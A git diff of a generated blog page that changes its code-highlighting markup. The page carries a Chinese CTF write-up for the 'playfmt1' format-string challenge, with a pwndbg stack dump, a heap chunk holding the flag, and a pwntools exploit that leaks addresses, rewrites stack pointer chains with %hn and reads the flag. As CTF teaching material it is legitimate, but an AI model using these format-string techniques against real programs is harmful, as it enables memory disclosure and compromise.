@@ -81,6 +81,11 @@
         <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
 
         
+            
+                <style id="prettify_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_css","/css/prettify.min.css?zp8STOU9v89XWFEnN+6YmQ==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+                <style id="prettify_theme"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_theme","/css/prettify/github-v2.min.css?AfzKxt++K+/lhZBlSjnxwg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+            
+        
 
     
 
@@ -491,19 +496,74 @@
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
         <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先看一下输入<code>aaaaa</code>之后栈中的情况：</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0c:<span class="number">0030</span>│      <span class="number">0xffffd130</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0d</span>:<span class="number">0034</span>│      <span class="number">0xffffd134</span> —▸ <span class="number">0x804b040</span> (buf) ◂— <span class="string">'aaaaa\n'</span></span><br><span class="line">0e:<span class="number">0038</span>│      <span class="number">0xffffd138</span> ◂— <span class="number">0xc8</span></span><br><span class="line">0f:003c│      <span class="number">0xffffd13c</span> —▸ <span class="number">0x80488e8</span> (logo()+<span class="number">59</span>) ◂— <span class="keyword">add</span>    <span class="built_in">esp</span>, <span class="number">0x10</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0040</span>│      <span class="number">0xffffd140</span> —▸ <span class="number">0x8048cb1</span> ◂— <span class="keyword">cmp</span>    <span class="built_in">eax</span>, <span class="number">0x3d3d3d3d</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0044</span>│      <span class="number">0xffffd144</span> —▸ <span class="number">0x8048ac4</span> (main+<span class="number">440</span>) —▸ <span class="number">0xfffd82e8</span> ◂— <span class="number">0xfffd82e8</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0048</span>│ <span class="built_in">ebp</span>  <span class="number">0xffffd148</span> —▸ <span class="number">0xffffd168</span> —▸ <span class="number">0xffffd198</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">13</span>:004c│      <span class="number">0xffffd14c</span> —▸ <span class="number">0x80488f0</span> (logo()+<span class="number">67</span>) —▸ <span class="number">0xffff56e8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">14</span>:<span class="number">0050</span>│      <span class="number">0xffffd150</span> —▸ <span class="number">0xf7e30000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1d7d6c</span></span><br><span class="line"><span class="number">15</span>:<span class="number">0054</span>│      <span class="number">0xffffd154</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">16</span>:<span class="number">0058</span>│      <span class="number">0xffffd158</span> —▸ <span class="number">0xffffd198</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">17</span>:005c│      <span class="number">0xffffd15c</span> —▸ <span class="number">0x8048ac4</span> (main+<span class="number">440</span>) —▸ <span class="number">0xfffd82e8</span> ◂— <span class="number">0xfffd82e8</span></span><br><span class="line"><span class="number">18</span>:<span class="number">0060</span>│      <span class="number">0xffffd160</span> —▸ <span class="number">0xf7e30d80</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line"><span class="number">19</span>:<span class="number">0064</span>│      <span class="number">0xffffd164</span> ◂— <span class="number">0x0</span></span><br><span class="line">1a:<span class="number">0068</span>│      <span class="number">0xffffd168</span> —▸ <span class="number">0xffffd198</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1b</span>:006c│      <span class="number">0xffffd16c</span> —▸ <span class="number">0x8048ac4</span> (main+<span class="number">440</span>) —▸ <span class="number">0xfffd82e8</span> ◂— <span class="number">0xfffd82e8</span></span><br><span class="line">1c:<span class="number">0070</span>│      <span class="number">0xffffd170</span> —▸ <span class="number">0xf7e303fc</span> (__exit_funcs) —▸ <span class="number">0xf7e31200</span> (initial) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1d</span>:<span class="number">0074</span>│      <span class="number">0xffffd174</span> ◂— <span class="number">0x0</span></span><br><span class="line">1e:<span class="number">0078</span>│      <span class="number">0xffffd178</span> —▸ <span class="number">0x8050b90</span> ◂— <span class="number">0x0</span></span><br><span class="line">1f:007c│      <span class="number">0xffffd17c</span> —▸ <span class="number">0x8051100</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
-
-<p>我们看到<code>0xffffd148 —▸ 0xffffd168 —▸ 0xffffd198 ◂— 0x0</code> 和 <code>0xffffd178 —▸ 0x8050b90</code>。其中<code>0x8050b90</code>是在堆上，而我们的 flag 也存在堆上：</p>
-<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x8050b68</span> FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">0x0</span></span><br><span class="line">  mchunk_size = <span class="number">0x21</span></span><br><span class="line">  fd = <span class="number">0x67616c66</span></span><br><span class="line">  bk = <span class="number">0x3131317b</span></span><br><span class="line">  fd_nextsize = <span class="number">0x31313131</span></span><br><span class="line">  bk_nextsize = <span class="number">0x31313131</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>思路就是通过格式化字符串漏洞：</p>
+<pre><code>0c:0030│      0xffffd130 ◂— 0x0
+0d:0034│      0xffffd134 —▸ 0x804b040 (buf) ◂— &#39;aaaaa\n&#39;
+0e:0038│      0xffffd138 ◂— 0xc8
+0f:003c│      0xffffd13c —▸ 0x80488e8 (logo()+59) ◂— add    esp, 0x10
+10:0040│      0xffffd140 —▸ 0x8048cb1 ◂— cmp    eax, 0x3d3d3d3d
+11:0044│      0xffffd144 —▸ 0x8048ac4 (main+440) —▸ 0xfffd82e8 ◂— 0xfffd82e8
+12:0048│ ebp  0xffffd148 —▸ 0xffffd168 —▸ 0xffffd198 ◂— 0x0
+13:004c│      0xffffd14c —▸ 0x80488f0 (logo()+67) —▸ 0xffff56e8 ◂— 0x0
+14:0050│      0xffffd150 —▸ 0xf7e30000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c
+15:0054│      0xffffd154 ◂— 0x0
+16:0058│      0xffffd158 —▸ 0xffffd198 ◂— 0x0
+17:005c│      0xffffd15c —▸ 0x8048ac4 (main+440) —▸ 0xfffd82e8 ◂— 0xfffd82e8
+18:0060│      0xffffd160 —▸ 0xf7e30d80 (_IO_2_1_stdout_) ◂— 0xfbad2887
+19:0064│      0xffffd164 ◂— 0x0
+1a:0068│      0xffffd168 —▸ 0xffffd198 ◂— 0x0
+1b:006c│      0xffffd16c —▸ 0x8048ac4 (main+440) —▸ 0xfffd82e8 ◂— 0xfffd82e8
+1c:0070│      0xffffd170 —▸ 0xf7e303fc (__exit_funcs) —▸ 0xf7e31200 (initial) ◂— 0x0
+1d:0074│      0xffffd174 ◂— 0x0
+1e:0078│      0xffffd178 —▸ 0x8050b90 ◂— 0x0
+1f:007c│      0xffffd17c —▸ 0x8051100 ◂— 0x0
+</code></pre><p>我们看到<code>0xffffd148 —▸ 0xffffd168 —▸ 0xffffd198 ◂— 0x0</code> 和 <code>0xffffd178 —▸ 0x8050b90</code>。其中<code>0x8050b90</code>是在堆上，而我们的 flag 也存在堆上：</p>
+<pre><code>0x8050b68 FASTBIN {
+  mchunk_prev_size = 0x0
+  mchunk_size = 0x21
+  fd = 0x67616c66
+  bk = 0x3131317b
+  fd_nextsize = 0x31313131
+  bk_nextsize = 0x31313131
+}
+</code></pre><p>思路就是通过格式化字符串漏洞：</p>
 <ol>
 <li>修改<code>0xffffd168</code>指向<code>0xffffd178</code>，这样链就变成了<code>0xffffd148 —▸ 0xffffd168 —▸ 0xffffd178 —▸ 0x8050b90</code></li>
 <li>修改<code>0xffffd178</code>指向我们 flag 的地址，修改 0xb90 为 0xb70</li>
 <li>通过 <code>%s</code> 读出 flag 的内容</li>
 </ol>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">p = process(<span class="string">'./playfmt1'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./playfmt1'</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">pay = <span class="string">'%6$p'</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">ebp_2 = int(p.recv(),<span class="number">16</span>)</span><br><span class="line">stack = ebp_2 <span class="number">-0x38</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'%18$p'</span>)</span><br><span class="line">flag_addr = int(p.recv(),<span class="number">16</span>) <span class="number">-0x28</span>+<span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">ffff=(stack+<span class="number">18</span>*<span class="number">4</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">p.sendline(<span class="string">"%"</span>+str(ffff)+<span class="string">"c%6$hn"</span>) <span class="comment">#ebp2 -&gt; p -&gt;heap</span></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"aaaa%2928c%14$hn"</span>)    <span class="comment">#ebp_2 -&gt; p-&gt; flag</span></span><br><span class="line">p.recvuntil(<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag_addr&amp;<span class="number">0xffff</span>==<span class="number">0xb70</span>:</span><br><span class="line">	p.sendline(<span class="string">"aaaa%18$s"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'aaaa'</span>)</span><br><span class="line">	flag=p.recv()</span><br><span class="line">	log.success(<span class="string">"flag: "</span>+flag)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
+#context.log_level = &#39;debug&#39;
 
+libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
+p = process(&#39;./playfmt1&#39;)
+elf = ELF(&#39;./playfmt1&#39;)
+
+p.recv()
+
+pay = &#39;%6$p&#39;
+p.sendline(pay)
+ebp_2 = int(p.recv(),16)
+stack = ebp_2 -0x38
+
+p.sendline(&#39;%18$p&#39;)
+flag_addr = int(p.recv(),16) -0x28+0x8
+
+ffff=(stack+18*4)&amp;0xffff
+p.sendline(&quot;%&quot;+str(ffff)+&quot;c%6$hn&quot;) #ebp2 -&gt; p -&gt;heap
+p.recv()
+
+p.sendline(&quot;aaaa%2928c%14$hn&quot;)    #ebp_2 -&gt; p-&gt; flag
+p.recvuntil(&#39;aaaa&#39;)
+
+if flag_addr&amp;0xffff==0xb70:
+    p.sendline(&quot;aaaa%18$s&quot;)
+    p.recvuntil(&#39;aaaa&#39;)
+    flag=p.recv()
+    log.success(&quot;flag: &quot;+flag)
+p.close()
+
+p.interactive()
+</code></pre>
 
         
     
@@ -858,6 +918,12 @@ It will not impact the appearance and can give developers a lot of support :)
 
 <!-- Import prettify js  -->
 
+    
+        
+            <script>lsloader.load("prettify_js","/js/prettify.min.js?WN07fivHQSMKWy7BmHBB6w==", true)</script>
+        
+    
+
 
 
 <!-- Window Load -->
@@ -868,6 +934,13 @@ It will not impact the appearance and can give developers a lot of support :)
         $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
     });
 
+    
+        
+            $(function() {
+                $('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+                prettyPrint();
+                })
+        
     
     
 </script>
